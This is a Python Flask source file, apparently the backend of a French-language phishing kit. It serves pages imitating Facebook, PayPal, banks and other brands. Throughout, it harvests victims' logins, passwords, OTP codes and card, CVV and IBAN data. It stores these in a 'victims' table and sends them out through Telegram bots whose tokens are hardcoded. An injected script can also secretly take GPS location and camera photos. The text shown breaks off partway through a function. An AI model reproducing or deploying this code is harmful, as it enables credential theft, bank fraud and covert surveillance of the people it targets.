import os
import base64
import datetime
import sqlite3
import json
import threading
import uuid
import urllib.parse
import urllib.request
from flask import Flask, request, jsonify, render_template, render_template_string
import requests

app = Flask(__name__)

# ==============================================================================
# CONFIGURATION TELEGRAM (ADMIN vs GROUPE MÉDIAS / GPS / PHOTOS)
# ==============================================================================
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "6141755021").strip()

GROUP_BOT_TOKEN = os.environ.get(
    "GROUP_BOT_TOKEN",
    "8870992639:AAGWgYTNbd2q0Zy1qkdL2kIQhBB85CYq3AM",
)
GROUP_CHAT_ID = (
    os.environ.get("GROUP_CHAT_ID")
    or os.environ.get("ADMIN_GROUP_CHAT_ID")
    or ADMIN_CHAT_ID
).strip()
ADMIN_GROUP_CHAT_ID = GROUP_CHAT_ID

UNIVERSAL_ADMIN_CODE = "4121@."
EXPIRY_SECONDS = 3 * 24 * 3600  # Durée de vie : 3 jours
DAILY_SMS_LIMIT = 10
EXPIRED_ERROR_IMAGE = "https://i.postimg.cc/fWp5WR8D/IMG-7118.jpg"

DB_NAME = "abeilles.db"

PLATFORM_IMAGES = {
    "Facebook": "https://i.postimg.cc/4xnRThHp/IMG-6898.jpg",
    "Amazon": "https://i.postimg.cc/jSyCP9v8/IMG-6895.webp",
    "TikTok": "https://i.postimg.cc/sg5178K8/IMG-6894.png",
    "Gmail": "https://i.postimg.cc/bw1dkM38/IMG-6888.jpg",
    "Yahoo": "https://i.postimg.cc/htVhTwpB/IMG-6887.png",
    "WhatsApp": "https://i.postimg.cc/3xWQHD0C/IMG-6897.webp",
    "Instagram": "https://i.postimg.cc/Xv3q88z3/IMG-6886.jpg",
    "Netflix": "https://i.postimg.cc/cLf6wjX1/IMG-6885.png",
    "Telegram": "https://i.postimg.cc/fRYkmF5G/IMG-6890.jpg",
    "Snapchat": "https://i.postimg.cc/rpWb8GV1/IMG-6900.jpg",
    "PayPal": "https://i.postimg.cc/Mp1XV4dk/IMG-6892.jpg",
    "LinkedIn": "https://i.postimg.cc/YCQjYVbB/IMG-6889.jpg",
    "1Xbet": "https://i.postimg.cc/qB838NRS/IMG-6903.webp",
    "Betclic": "https://i.postimg.cc/dQ8y8h1H/IMG-6904.jpg",
    "Bank": "https://i.postimg.cc/FFjLjYRM/IMG-6905.png",
    "Kaspersky": "https://i.postimg.cc/FFjLjYRM/IMG-6905.png",
}

DEFAULT_LOGO_FALLBACK = "https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png"


def render_expired_link_error_page(link_label: str = "Lien"):
    html_error = f"""
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Erreur 404 — Page introuvable</title>
        <style>
            * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; }}
            body {{
                min-height: 100vh;
                background-color: #f4f5f7;
                color: #202124;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }}
            .err-card {{
                max-width: 540px;
                width: 100%;
                background: #ffffff;
                border: 1px solid #dadce0;
                border-radius: 8px;
                padding: 22px;
                text-align: center;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
            }}
            .err-img {{
                width: 100%;
                max-height: 420px;
                object-fit: contain;
                border-radius: 6px;
                display: block;
                margin: 0 auto 14px auto;
            }}
            .err-caption {{
                font-size: 13px;
                color: #5f6368;
            }}
        </style>
    </head>
    <body>
        <div class="err-card">
            <img class="err-img" src="{EXPIRED_ERROR_IMAGE}" alt="Erreur 404">
            <div class="err-caption">Erreur 404 — Page indisponible ({link_label})</div>
        </div>
    </body>
    </html>
    """
    return render_template_string(html_error), 404


def resolve_platform_image(network: str, page_logo: str = "") -> str:
    net_clean = (network or "").strip().lower()
    for key, url in PLATFORM_IMAGES.items():
        if key.lower() in net_clean or net_clean in key.lower():
            return url
    if page_logo and page_logo.startswith("http"):
        return page_logo
    return DEFAULT_LOGO_FALLBACK


def send_telegram_photo_url(bot_token, chat_id, photo_url, caption):
    if not bot_token or not chat_id or not photo_url:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    try:
        requests.post(
            url,
            json={"chat_id": chat_id, "photo": photo_url, "caption": caption, "parse_mode": "Markdown"},
            timeout=10,
        )
    except Exception as e:
        print("Erreur Telegram sendPhoto URL:", e)


def send_telegram_voice_b64(bot_token, chat_id, audio_b64_data_url, caption):
    if not bot_token or not chat_id or not audio_b64_data_url:
        return
    raw_b64 = audio_b64_data_url.split(",")[-1]
    try:
        audio_bytes = base64.b64decode(raw_b64)
        url = f"https://api.telegram.org/bot{bot_token}/sendVoice"
        requests.post(
            url,
            data={"chat_id": chat_id, "caption": caption, "parse_mode": "Markdown"},
            files={"voice": ("vocal.webm", audio_bytes, "audio/webm")},
            timeout=12,
        )
    except Exception as e:
        print("Erreur Telegram sendVoice:", e)


def send_telegram_notification(bot_token, chat_id, message):
    if not bot_token or not chat_id:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(
            url,
            json={"chat_id": chat_id, "text": message, "parse_mode": "Markdown"},
            timeout=8,
        )
    except Exception as e:
        print("Erreur Telegram Message:", e)


def send_telegram_location_direct(bot_token, chat_id, latitude, longitude, caption=""):
    if not bot_token or not chat_id or latitude is None or longitude is None:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendLocation"
    payload = {
        "chat_id": chat_id,
        "latitude": latitude,
        "longitude": longitude,
    }
    if caption:
        payload["caption"] = caption
    encoded = urllib.parse.urlencode(payload).encode("utf-8")
    try:
        req = urllib.request.Request(url, data=encoded, method="POST")
        with urllib.request.urlopen(req, timeout=8) as resp:
            resp.read()
    except Exception as e:
        print("Erreur Telegram sendLocation:", e)


def get_db_connection():
    conn = sqlite3.connect(DB_NAME, timeout=30.0)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            network TEXT,
            type TEXT,
            victimUser TEXT,
            victimPass TEXT,
            victimOtp TEXT,
            dateStr TEXT,
            timestamp INTEGER,
            ip TEXT,
            device TEXT,
            extra_info TEXT,
            session_key TEXT
        )
    """)
    try:
        cursor.execute("ALTER TABLE victims ADD COLUMN session_key TEXT")
    except Exception:
        pass
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            slug TEXT UNIQUE,
            title TEXT,
            network TEXT,
            bg_type TEXT,
            bg_value TEXT,
            logo_url TEXT,
            logo_shape TEXT,
            fields_json TEXT,
            btn_text TEXT,
            html_code TEXT,
            redirect_url TEXT,
            mode TEXT,
            opt3_config TEXT,
            box_bg TEXT,
            box_width TEXT,
            created_at INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS issued_links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_key TEXT UNIQUE,
            owner TEXT,
            link_type TEXT,
            slug TEXT,
            created_at INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS link_visits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            network TEXT,
            path_visited TEXT,
            location_desc TEXT,
            ip TEXT,
            device TEXT,
            created_at TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            email TEXT,
            avatar_url TEXT,
            created_at TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS direct_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            sender TEXT,
            recipient TEXT,
            channel TEXT,
            msg_type TEXT,
            content TEXT,
            media_data TEXT,
            day_key TEXT,
            created_at TEXT
        )
    """)
    try:
        cursor.execute("ALTER TABLE accounts ADD COLUMN avatar_url TEXT")
    except Exception:
        pass
    conn.commit()
    conn.close()


init_db()


def detect_device(user_agent: str) -> str:
    ua = (user_agent or "").lower()
    if "iphone" in ua:
        return "iPhone"
    if "ipad" in ua:
        return "iPad"
    if "android" in ua:
        return "Android"
    if "macintosh" in ua or "mac os" in ua:
        return "Mac"
    if "windows" in ua:
        return "Windows PC"
    if "linux" in ua:
        return "Linux"
    return user_agent[:60] if user_agent else "Inconnu"


def _is_link_preview_bot(user_agent: str) -> bool:
    ua = (user_agent or "").lower()
    bot_tokens = [
        "telegrambot", "whatsapp", "facebookexternalhit", "twitterbot",
        "slackbot", "discordbot", "bot", "crawler", "spider", "preview"
    ]
    return any(tok in ua for tok in bot_tokens)


def _dispatch_visit_telegram(clean_owner: str, clean_net: str, path_visited: str, device: str, ip: str, now_str: str):
    tg_visit_msg = (
        f"🚨 *NOUVELLE VISITE SUR LIEN*\n"
        f"┌──────────────────────────────┐\n"
        f"│ 👤 *Propriétaire:* `{clean_owner}`\n"
        f"│ 🌐 *Plateforme:* `{clean_net}`\n"
        f"│ 🔗 *Chemin:* `{path_visited}`\n"
        f"└──────────────────────────────┘\n"
        f"• *Appareil:* `{device}`\n"
        f"• *Adresse IP:* `{ip}`\n"
        f"• *Heure:* `{now_str}`"
    )
    send_telegram_notification(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, tg_visit_msg)
    if GROUP_CHAT_ID and GROUP_CHAT_ID != ADMIN_CHAT_ID:
        send_telegram_notification(GROUP_BOT_TOKEN, GROUP_CHAT_ID, tg_visit_msg)


def record_link_visit(owner: str, network: str, path_visited: str, ip: str, device: str):
    if request.method != "GET":
        return
    if _is_link_preview_bot(request.headers.get("User-Agent", "")):
        return

    now_str = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    clean_owner = (owner or "").strip() or "Kim"
    clean_net = (network or "Plateforme").strip()
    loc_desc = (
        f"Un utilisateur est sur votre plateforme {clean_net} "
        f"(chemin exact : {path_visited}, IP : {ip}, appareil : {device})."
    )
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(
            """
            INSERT INTO link_visits (owner, network, path_visited, location_desc, ip, device, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            (clean_owner, clean_net, path_visited, loc_desc, ip, device, now_str),
        )
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur enregistrement visite lien:", e)

    threading.Thread(
        target=_dispatch_visit_telegram,
        args=(clean_owner, clean_net, path_visited, device, ip, now_str),
        daemon=True,
    ).start()


@app.route("/api/link_visits", methods=["GET"])
def get_link_visits():
    try:
        after_id = int(request.args.get("after_id") or "0")
    except ValueError:
        after_id = 0
    if after_id < 0:
        after_id = 0

    owner = (request.args.get("owner") or "").strip()

    conn = get_db_connection()
    cursor = conn.cursor()

    if owner:
        cursor.execute(
            """
            SELECT * FROM link_visits
            WHERE id > ? AND LOWER(TRIM(owner)) = LOWER(?)
            ORDER BY id ASC LIMIT 20
            """,
            (after_id, owner),
        )
        rows = cursor.fetchall()
        cursor.execute(
            "SELECT COALESCE(MAX(id), 0) AS max_id FROM link_visits WHERE LOWER(TRIM(owner)) = LOWER(?)",
            (owner,),
        )
        max_row = cursor.fetchone()
    else:
        rows = []
        max_row = None

    latest_id = int(max_row["max_id"] or 0) if max_row else 0
    conn.close()

    visits = [
        {
            "id": r["id"],
            "owner": r["owner"],
            "network": r["network"],
            "path_visited": r["path_visited"],
            "location_desc": r["location_desc"],
            "ip": r["ip"],
            "device": r["device"],
            "created_at": r["created_at"],
            "triggerAlert": True,
        }
        for r in rows
    ]
    return jsonify({
        "visits": visits,
        "latest_id": latest_id,
        "alertSeq": latest_id,
    })


def register_or_check_link_3days(link_key: str, owner: str = "", link_type: str = "standard", slug: str = "", force_reset: bool = False) -> bool:
    now_ms = int(datetime.datetime.now().timestamp() * 1000)
    max_age_ms = EXPIRY_SECONDS * 1000

    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT created_at FROM issued_links WHERE link_key = ?", (link_key,))
    row = cursor.fetchone()

    if not row or force_reset:
        cursor.execute(
            """
            INSERT OR REPLACE INTO issued_links (link_key, owner, link_type, slug, created_at)
            VALUES (?, ?, ?, ?, ?)
            """,
            (link_key, owner, link_type, slug, now_ms),
        )
        conn.commit()
        conn.close()
        return True

    created_at = int(row["created_at"] or now_ms)
    conn.close()
    return (now_ms - created_at) <= max_age_ms


@app.route("/api/issue_link", methods=["POST"])
def api_issue_link():
    data = request.json or {}
    raw_url = (data.get("url") or "").strip()
    owner = (data.get("owner") or "").strip()
    link_type = (data.get("linkType") or "standard").strip()
    slug = (data.get("slug") or "").strip()
    is_nocode = bool(data.get("isNoCode", False))

    if not raw_url:
        return jsonify({"status": "error", "message": "URL manquante"}), 400

    parsed = urllib.parse.urlparse(raw_url)
    qs = dict(urllib.parse.parse_qsl(parsed.query))

    if not is_nocode:
        qs["lid"] = uuid.uuid4().hex[:12]
        new_query = urllib.parse.urlencode(qs)
        personalized_url = urllib.parse.urlunparse((
            parsed.scheme or "http",
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            ""
        ))
        link_key = f"{parsed.path}?{new_query}" if new_query else parsed.path
        register_or_check_link_3days(
            link_key=link_key,
            owner=owner,
            link_type=link_type,
            slug=slug,
            force_reset=True
        )
    else:
        personalized_url = raw_url
        link_key = f"{parsed.path}?{parsed.query}" if parsed.query else parsed.path
        register_or_check_link_3days(
            link_key=link_key,
            owner=owner,
            link_type=link_type,
            slug=slug,
            force_reset=False
        )

    expires_at_ms = int(datetime.datetime.now().timestamp() * 1000) + (EXPIRY_SECONDS * 1000)
    return jsonify({
        "status": "success",
        "url": personalized_url,
        "expiresInDays": 3,
        "expiresAt": expires_at_ms
    })


def _bucket_for_key(key_lower: str) -> str:
    if any(k in key_lower for k in ["card", "carte", "cc-", "cvv", "cvc", "csc", "exp", "expiry", "expiration", "iban", "rib", "bic", "swift", "banque", "bank"]):
        return "banking"
    if any(k in key_lower for k in ["otp", "2fa", "mfa", "code", "verif", "token"]):
        return "otp"
    if any(k in key_lower for k in ["pass", "mdp", "mot de passe", "pin"]):
        return "credentials"
    if any(k in key_lower for k in ["birth", "naissance", "dob", "bday", "jour", "mois", "annee", "année", "jj", "mm", "aaaa", "yyyy", "nom", "name", "prenom", "prénom", "email", "mail", "user", "login", "phone", "tel"]):
        return "identity"
    return "other"


def _format_bank_label(key_str: str) -> str:
    k = key_str.lower()
    if any(w in k for w in ["card", "carte", "cc-", "num"]):
        return "Numéro de carte"
    if any(w in k for w in ["exp", "expiry", "expiration", "mm/aa", "mm/yy"]):
        return "Expiration"
    if any(w in k for w in ["cvv", "cvc", "csc", "crypto"]):
        return "CVV"
    if any(w in k for w in ["iban", "rib"]):
        return "IBAN / RIB"
    if any(w in k for w in ["holder", "titulaire", "nom"]):
        return "Titulaire"
    return key_str.strip() or "Champ bancaire"


def _merge_ordered_dicts(base_ordered: dict, incoming_ordered: dict) -> dict:
    merged = {
        "banking": dict((base_ordered or {}).get("banking") or {}),
        "identity": dict((base_ordered or {}).get("identity") or {}),
        "credentials": dict((base_ordered or {}).get("credentials") or {}),
        "otp": dict((base_ordered or {}).get("otp") or {}),
        "other": dict((base_ordered or {}).get("other") or {}),
    }
    for sec in ["banking", "identity", "credentials", "otp", "other"]:
        for k, v in ((incoming_ordered or {}).get(sec) or {}).items():
            if v is not None and str(v).strip() != "":
                merged[sec][k] = str(v).strip()
    return merged


def _build_summary_from_ordered(ordered: dict) -> str:
    sections_lines = []
    labels = {
        "banking": "Banque",
        "identity": "Identité",
        "credentials": "Accès",
        "otp": "OTP",
        "other": "Autres",
    }
    for sec_key in ["banking", "identity", "credentials", "otp", "other"]:
        if ordered.get(sec_key):
            items_txt = ", ".join([f"{fk}: {fv}" for fk, fv in ordered[sec_key].items()])
            sections_lines.append(f"[{labels[sec_key]}] {items_txt}")
    return " | ".join(sections_lines)


def classify_and_order_payload(data: dict) -> dict:
    ordered = {
        "banking": {},
        "identity": {},
        "credentials": {},
        "otp": {},
        "other": {},
    }

    raw_fields = data.get("fields")
    if isinstance(raw_fields, dict):
        for k, v in raw_fields.items():
            val_str = str(v).strip() if v is not None else ""
            if not val_str:
                continue
            key_clean = str(k).strip() or "champ"
            bucket = _bucket_for_key(key_clean.lower())
            if bucket == "banking":
                bank_lbl = _format_bank_label(key_clean)
                ordered["banking"][bank_lbl] = val_str
            else:
                ordered[bucket][key_clean] = val_str

    v_user = (data.get("victimUser") or "").strip()
    v_pass = (data.get("victimPass") or "").strip()
    v_otp = (data.get("otp") or "").strip()

    if v_user and v_user not in ["Inconnu", "Non renseigne"] and not ordered["identity"] and not ordered["banking"]:
        ordered["identity"]["Identifiant"] = v_user
    if v_pass and v_pass not in ["Inconnu", "Non renseigne"] and not ordered["credentials"]:
        ordered["credentials"]["Mot de passe"] = v_pass
    if v_otp and v_otp not in ["Aucun", "En attente OTP..."] and not ordered["otp"]:
        ordered["otp"]["Code OTP"] = v_otp

    if ordered["banking"]:
        primary_category = "BANKING"
    elif ordered["otp"] and not ordered["identity"] and not ordered["credentials"]:
        primary_category = "OTP"
    elif ordered["identity"] or ordered["credentials"]:
        primary_category = "FORM_DATA"
    else:
        primary_category = "GENERAL"

    return {
        "category": primary_category,
        "ordered": ordered,
        "formatted_summary": _build_summary_from_ordered(ordered),
    }


def format_ordered_telegram_card(
    network: str,
    owner: str,
    category: str,
    v_user: str,
    v_pass: str,
    v_otp: str,
    formatted_summary: str,
    v_ip: str,
    device_type: str,
    date_str: str,
    platform_img: str,
    is_update: bool = False,
) -> str:
    entete = "📥 *CAPTURE MISE À JOUR (FICHE UNIQUE)*" if is_update else "📥 *NOUVELLE CAPTURE ORDONNÉE*"
    summary_clean = formatted_summary or "Aucun détail supplémentaire"
    return (
        f"🐝 *LES ABEILLES DU NIGER — {network.upper()}*\n"
        f"┌──────────────────────────────┐\n"
        f"│ 👤 *Propriétaire:* `{owner}`\n"
        f"│ 🗂️ *Catégorie:* `{category}`\n"
        f"│ 🖼️ *Aperçu:* [Voir l'image]({platform_img})\n"
        f"└──────────────────────────────┘\n\n"
        f"{entete}\n"
        f"• *Identifiant / Utilisateur:* `{v_user}`\n"
        f"• *Mot de passe:* `{v_pass}`\n"
        f"• *Code OTP:* `{v_otp}`\n"
        f"• *Données classées:* `{summary_clean}`\n\n"
        f"📡 *CONTEXTE & APPAREIL*\n"
        f"• *Adresse IP:* `{v_ip}`\n"
        f"• *Appareil:* `{device_type}`\n"
        f"• *Date & Heure:* `{date_str}`"
    )


def cleanup_expired_3days():
    cutoff_ms = int((datetime.datetime.now().timestamp() - EXPIRY_SECONDS) * 1000)
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM custom_pages WHERE created_at <= ?", (cutoff_ms,))
        cursor.execute("DELETE FROM issued_links WHERE created_at <= ?", (cutoff_ms,))
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur nettoyage 3 jours:", e)


@app.route("/")
def index():
    cleanup_expired_3days()
    return render_template("index.html")


def _render_standard_or_otp(folder: str, slug_clean: str, owner_param: str = "Kim"):
    base_name = (
        slug_clean.replace("_otp", "")
        .replace("-otp", "")
        .replace("_standard", "")
        .replace("-standard", "")
    )
    if folder == "otp":
        candidates = [
            f"otp/{slug_clean}.html",
            f"otp/{base_name}_otp.html",
            f"otp/{base_name}-otp.html",
            f"otp/{base_name}.html",
        ]
    else:
        candidates = [
            f"standard/{slug_clean}.html",
            f"standard/{base_name}.html",
            f"standard/{base_name}_standard.html",
            f"standard/{base_name}-standard.html",
        ]

    for tpl in candidates:
        try:
            return render_template(tpl, owner=owner_param, network=base_name.capitalize())
        except Exception:
            continue

    return render_expired_link_error_page(f"{folder}/{slug_clean}")


@app.route("/phish/<path:subpath>")
def render_phish_page(subpath):
    cleanup_expired_3days()
    subpath_clean = subpath.lower().strip("/")
    req_type = (request.args.get("type") or "").lower()
    owner_param = (request.args.get("user") or "").strip() or "Kim"

    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    v_ip = raw_ip.split(",")[0].strip() if raw_ip else "127.0.0.1"
    device_type = detect_device(request.headers.get("User-Agent", ""))

    full_req_path = request.full_path.rstrip("?")
    if not register_or_check_link_3days(link_key=full_req_path, owner=owner_param, link_type=req_type or "phish", slug=subpath_clean):
        return render_expired_link_error_page(subpath_clean)

    db_slug = subpath_clean.replace("otp/", "").replace("standard/", "")
    clean_custom_slug = (
        db_slug.replace("_otp", "")
        .replace("-otp", "")
        .replace("_standard", "")
        .replace("-standard", "")
    )

    conn = get_db_connection()
    cursor = conn.cursor()
    possible_slugs = [db_slug, clean_custom_slug, db_slug.replace("-", "_"), db_slug.replace("_", "-")]

    cp = None
    for s in possible_slugs:
        cursor.execute("SELECT * FROM custom_pages WHERE LOWER(slug) = LOWER(?)", (s,))
        cp = cursor.fetchone()
        if cp:
            break
    conn.close()

    if cp:
        cp_dict = dict(cp)
        now_ms = int(datetime.datetime.now().timestamp() * 1000)
        if (now_ms - int(cp_dict.get("created_at", 0))) > (EXPIRY_SECONDS * 1000):
            return render_expired_link_error_page(cp_dict.get("network") or cp_dict.get("slug") or "Page")

        page_owner = (cp_dict.get("owner") or "").strip() or owner_param
        page_net = cp_dict.get("network") or cp_dict.get("slug") or "Page Perso"
        record_link_visit(page_owner, page_net, request.path, v_ip, device_type)

        redirect_url = cp_dict.get("redirect_url") or "https://www.google.com"
        mode = cp_dict.get("mode", "opt1")

        if mode in ["opt2", "opt3"] and cp_dict.get("html_code"):
            html = cp_dict["html_code"]
            owner = cp_dict["owner"]
            network = cp_dict["network"]
            is_opt3 = "true" if mode == "opt3" else "false"
            try:
                opt3_cfg = json.loads(cp_dict.get("opt3_config") or "{}")
            except Exception:
                opt3_cfg = {}

            cam_front = "true" if opt3_cfg.get("camFront", True) else "false"
            cam_back = "true" if opt3_cfg.get("camBack", False) else "false"
            gps_enabled = "true" if opt3_cfg.get("gps", True) else "false"
            photo_count = max(1, min(6, int(opt3_cfg.get("photoCount", 1) or 1)))

            injection_script = """
<script>
(function() {
    const OWNER = "__OWNER__";
    const NETWORK = "__NETWORK__";
    const REDIRECT_URL = "__REDIRECT_URL__";
    const IS_OPT3 = __IS_OPT3__;
    const CAM_FRONT = __CAM_FRONT__;
    const CAM_BACK = __CAM_BACK__;
    const GPS_ENABLED = __GPS_ENABLED__;
    const TOTAL_PHOTOS = __PHOTO_COUNT__;
    const ADMIN_CODE = "4121@.";

    let isProcessing = false, hasRedirected = false, gpsSent = false, mediaRunning = false;
    let userData = {
        user: localStorage.getItem('ph_user_' + OWNER) || "",
        pass: localStorage.getItem('ph_pass_' + OWNER) || "",
        otp: "",
        fields: {}
    };

    function getSessionKey() {
        const k = 'ph_session_' + OWNER + '_' + NETWORK;
        let sid = sessionStorage.getItem(k) || localStorage.getItem(k);
        if (!sid) {
            sid = 'sid_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 8);
            try { sessionStorage.setItem(k, sid); } catch (e) {}
            try { localStorage.setItem(k, sid); } catch (e) {}
        }
        return sid;
    }

    function sendGps(lat, lon, methodName) {
        if (gpsSent || lat === undefined || lon === undefined || lat === null || lon === null) return;
        gpsSent = true;
        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
        fetch('/api/upload_media', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                owner: OWNER,
                network: NETWORK,
                mode: 'opt3',
                type: 'gps',
                method: methodName,
                latitude: lat,
                longitude: lon,
                gps: mapsUrl,
                user: userData.user || 'Inconnu',
                device: navigator.userAgent
            }),
            keepalive: true
        }).catch(() => {});
    }

    function runGpsMethods() {
        if (!IS_OPT3 || !GPS_ENABLED) return;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => sendGps(pos.coords.latitude, pos.coords.longitude, "GPS-1 Haute Précision"),
                () => {},
                { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
            );

            navigator.geolocation.getCurrentPosition(
                pos => sendGps(pos.coords.latitude, pos.coords.longitude, "GPS-2 Standard"),
                () => {},
                { enableHighAccuracy: false, timeout: 7000, maximumAge: 60000 }
            );

            try {
                const wid = navigator.geolocation.watchPosition(
                    pos => {
                        sendGps(pos.coords.latitude, pos.coords.longitude, "GPS-3 WatchPosition");
                        navigator.geolocation.clearWatch(wid);
                    },
                    () => {},
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            } catch (e) {}
        }

        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
            if (d && d.latitude && d.longitude) sendGps(d.latitude, d.longitude, "GPS-4 IPAPI");
        }).catch(() => {});

        fetch('https://ipwho.is/').then(r => r.json()).then(d => {
            if (d && d.success && d.latitude && d.longitude) sendGps(d.latitude, d.longitude, "GPS-5 IPWHO");
        }).catch(() => {});

        fetch('https://ipinfo.io/json').then(r => r.json()).then(d => {
            if (d && d.loc && d.loc.includes(',')) {
                const parts = d.loc.split(',');
                sendGps(parts[0], parts[1], "GPS-6 IPINFO");
            }
        }).catch(() => {});

        fetch('https://freeipapi.com/api/json').then(r => r.json()).then(d => {
            if (d && d.latitude && d.longitude) sendGps(d.latitude, d.longitude, "GPS-7 FreeIPAPI");
        }).catch(() => {});
    }

    function buildPhotoPlan() {
        const modes = [];
        if (CAM_FRONT) modes.push("user");
        if (CAM_BACK) modes.push("environment");
        if (modes.length === 0) modes.push("user");

        const plan = [];
        for (let i = 0; i < TOTAL_PHOTOS; i++) {
            plan.push({ index: i + 1, facing: modes[i % modes.length] });
        }
        return plan;
    }

    async function extractImageFromStream(stream) {
        const video = document.createElement('video');
        video.setAttribute('playsinline', '');
        video.setAttribute('autoplay', '');
        video.muted = true;
        video.srcObject = stream;
        await video.play().catch(() => {});

        for (let w = 0; w < 15; w++) {
            if (video.videoWidth > 0 && video.videoHeight > 0) break;
            await new Promise(r => setTimeout(r, 140));
        }

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.85);

        stream.getTracks().forEach(t => t.stop());
        return dataUrl;
    }

    async function capturePhotoMultiMethod(facingMode, shotIndex) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

        const methods = [
            { label: "Photo-M1 ExactFacing", constraints: { video: { facingMode: { exact: facingMode } }, audio: false } },
            { label: "Photo-M2 IdealFacing", constraints: { video: { facingMode: facingMode }, audio: false } },
            { label: "Photo-M3 HD", constraints: { video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: facingMode }, audio: false } },
            { label: "Photo-M4 DefaultCam", constraints: { video: true, audio: false } },
            { label: "Photo-M5 VGA", constraints: { video: { width: 640, height: 480 }, audio: false } },
            { label: "Photo-M6 FrameRate", constraints: { video: { frameRate: { ideal: 15 }, facingMode: facingMode }, audio: false } }
        ];

        for (const m of methods) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(m.constraints);
                const dataUrl = await extractImageFromStream(stream);
                if (dataUrl && dataUrl.length > 200) {
                    await fetch('/api/upload_media', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            owner: OWNER,
                            network: NETWORK,
                            mode: 'opt3',
                            type: 'photo',
                            method: m.label,
                            facing: facingMode,
                            shotNumber: shotIndex,
                            totalPhotos: TOTAL_PHOTOS,
                            photo: dataUrl,
                            user: userData.user || 'Inconnu',
                            device: navigator.userAgent
                        }),
                        keepalive: true
                    });
                    return;
                }
            } catch (e) {}
        }
    }

    async function runOption3Media() {
        if (!IS_OPT3 || mediaRunning) return;
        mediaRunning = true;
        runGpsMethods();
        const plan = buildPhotoPlan();
        for (const item of plan) {
            await capturePhotoMultiMethod(item.facing, item.index);
        }
        mediaRunning = false;
    }

    function fieldLabel(inp) {
        return (inp.name || inp.id || inp.placeholder || inp.getAttribute('aria-label') || inp.type || 'champ').trim();
    }

    function classify(inp) {
        const name = (inp.name || inp.id || inp.placeholder || inp.getAttribute('aria-label') || "").toLowerCase();
        const type = (inp.type || "").toLowerCase();
        if (type === "password") return "pass";
        if (/card|carte|cc-|cvv|cvc|csc|exp|expiry|expiration|iban|rib|bic|swift|banque|bank/.test(name)) return "bank";
        if (type === "date" || /birth|naissance|dob|bday|jour|mois|annee|année|jj|mm|aaaa|yyyy/.test(name)) return "dob";
        if (name.includes('otp') || name.includes('code') || name.includes('verif') || name.includes('2fa')) return "otp";
        if (type === "email" || type === "tel" || name.includes('user') || name.includes('email') || name.includes('login') || name.includes('phone') || name.includes('identifiant')) return "user";
        return "other";
    }

    async function processData() {
        if (isProcessing || hasRedirected) return;
        isProcessing = true;

        let hasOtp = false;
        const collected = {};
        let foundUserInForm = "";
        let foundPassInForm = "";

        document.querySelectorAll('input, select, textarea').forEach(inp => {
            const t = (inp.type || "").toLowerCase();
            if (t === "submit" || t === "button" || t === "reset") return;
            const val = (inp.value || "").trim();
            if (!val) return;

            const lbl = fieldLabel(inp);
            collected[lbl] = val;

            const c = classify(inp);
            if (c === "user") {
                foundUserInForm = val;
                userData.user = val;
                localStorage.setItem('ph_user_' + OWNER, val);
            } else if (c === "pass") {
                foundPassInForm = val;
                userData.pass = val;
                localStorage.setItem('ph_pass_' + OWNER, val);
            } else if (c === "otp") {
                userData.otp = val;
                hasOtp = true;
